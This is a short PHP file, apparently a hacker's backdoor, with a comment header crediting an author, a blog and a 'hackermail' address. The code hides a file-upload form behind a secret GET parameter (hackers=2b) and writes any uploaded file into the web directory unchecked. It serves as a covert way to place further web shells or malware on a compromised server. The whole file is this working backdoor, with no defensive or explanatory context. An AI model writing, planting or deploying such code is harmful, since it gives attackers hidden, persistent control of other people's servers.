<!--------------------------
Name: 折羽鸿鹄
Site: http://blog.weili.me
Mail: chinese@hackermail.com
QQ: 56..
---------------------------->
<?php
if($_GET["hackers"]=="2b"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?>